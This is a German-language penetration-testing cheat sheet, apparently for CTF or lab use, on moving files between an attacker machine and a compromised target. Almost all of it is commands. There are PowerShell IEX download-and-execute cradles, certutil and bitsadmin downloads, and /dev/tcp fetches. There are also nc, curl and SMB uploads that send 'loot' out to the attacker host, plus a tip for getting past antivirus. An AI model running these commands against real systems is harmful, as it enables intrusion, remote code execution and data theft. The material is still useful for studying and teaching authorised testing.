# 📤 File Transfer

## Auf Angreifer: Server starten

```bash
# Python HTTP (Klassiker)
python3 -m http.server 8000
python3 -m http.server 80                # braucht sudo

# Mit Upload (uploadserver via pip)
python3 -m pip install uploadserver
python3 -m uploadserver 8000

# SMB-Server (für Windows-Targets — keine HTTP nötig!)
impacket-smbserver share . -smb2support
impacket-smbserver share . -smb2support -username user -password pass

# FTP
python3 -m pyftpdlib -p 21 -w
```

---

## 🐧 Linux Target — Download

```bash
wget http://$LHOST:8000/file
wget http://$LHOST:8000/file -O /tmp/file
curl http://$LHOST:8000/file -o /tmp/file
curl -O http://$LHOST:8000/file

# Wenn weder wget noch curl:
exec 3<>/dev/tcp/$LHOST/8000; echo -e "GET /file HTTP/1.1\r\nHost: $LHOST\r\n\r\n" >&3; cat <&3

# scp (mit creds)
scp file user@$RHOST:/tmp/

# Base64 in der Shell (für kleine Files)
# Auf Angreifer:
base64 -w0 file
# Auf Target:
echo "BASE64STRING" | base64 -d > file
```

---

## 🪟 Windows Target — Download

### PowerShell

```powershell
# Klassiker
(New-Object Net.WebClient).DownloadFile('http://10.10.10.1:8000/file.exe','C:\Temp\file.exe')

# IEX (direkt ausführen, kein File auf Disk)
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.1:8000/script.ps1')

# Invoke-WebRequest (PS3+)
iwr -uri http://10.10.10.1:8000/file.exe -outfile C:\Temp\file.exe

# PS Core
curl http://10.10.10.1:8000/file.exe -o file.exe
```

### CMD

```cmd
certutil -urlcache -split -f http://10.10.10.1:8000/file.exe C:\Temp\file.exe
certutil -urlcache -f http://10.10.10.1:8000/file.exe file.exe

# bitsadmin
bitsadmin /transfer myJob /download /priority normal http://10.10.10.1:8000/file.exe C:\Temp\file.exe
```

### Über SMB (kein HTTP-Server nötig!)

```cmd
# Wenn impacket-smbserver auf Angreifer läuft:
copy \\10.10.10.1\share\file.exe C:\Temp\file.exe
type \\10.10.10.1\share\script.ps1                    # direkt anzeigen

# PowerShell direkt vom Share ausführen
powershell -c "IEX(gc \\10.10.10.1\share\script.ps1 | out-string)"
```

---

## 📥 Upload (Target → Angreifer)

### Mit uploadserver (Python)

```bash
# Auf Angreifer
python3 -m uploadserver 8000

# Linux Target
curl -F 'files=@/tmp/loot.zip' http://$LHOST:8000/upload

# Windows Target (PS)
$file = "C:\Temp\loot.zip"
$body = @{files = Get-Item $file}
Invoke-WebRequest -Uri http://10.10.10.1:8000/upload -Method Post -Form $body
```

### Mit nc

```bash
# Auf Angreifer
nc -lvnp 9000 > received.file

# Linux Target
nc $LHOST 9000 < /tmp/file
cat /tmp/file | nc $LHOST 9000

# Windows Target (mit nc.exe)
nc.exe $LHOST 9000 < C:\Temp\file
```

### Mit SMB

```bash
# Auf Angreifer (writable)
impacket-smbserver share /tmp/loot -smb2support -username u -password p

# Auf Windows-Target
copy C:\Temp\loot.zip \\10.10.10.1\share\
```

---

## 📦 Tipps

- **Ports merken:** `8000` HTTP, `4444` Listener, `445` SMB. Nicht durcheinanderbringen.
- **Immer `tun0` IP nehmen**, nicht `eth0`: `ip a show tun0`
- **CRLF-Probleme bei .ps1?** → `dos2unix script.ps1` oder beim Erstellen `unix line endings` einstellen.
- **AV blockt download?** → SMB statt HTTP, oder Powershell base64-encoded (`-EncodedCommand`).
